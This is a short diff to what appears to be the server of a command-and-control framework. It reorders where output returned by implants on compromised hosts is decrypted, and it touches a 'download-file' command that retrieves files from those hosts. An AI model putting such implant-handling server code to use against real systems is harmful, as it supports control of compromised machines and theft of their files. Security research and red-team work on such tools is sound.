@@ -240,10 +240,11 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             if RandomURI in s.path and cookieVal:
               update_implant_lastseen(now.strftime("%m/%d/%Y %H:%M:%S"),RandomURI)
               decCookie = decrypt(encKey, cookieVal)
+              rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
               if decCookie.startswith("Error"):
                 print (Colours.RED)
                 print ("The multicmd errored: ")
-                print (decrypt_bytes_gzip(encKey, post_data[1500:]))
+                print (rawoutput)
                 print (Colours.GREEN)
                 s.send_response(200)
                 s.send_header("Content-type", "text/html")
@@ -260,7 +261,6 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
               else:
                 print ("Task %s returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implantID, Domain, User, Hostname,now.strftime("%m/%d/%Y %H:%M:%S")))
               #print decCookie,Colours.END
-              rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
               outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
               outputParsed = outputParsed.rstrip()
 
@@ -288,7 +288,6 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 print (outputParsed)
               elif "download-file" in executedCmd.lower():
                 try:
-                  rawoutput = decrypt_bytes_gzip(encKey, (post_data[1500:]))
                   filename = executedCmd.lower().replace("download-file ","")
                   filename = filename.replace("-source ","")
                   filename = filename.replace("..","")
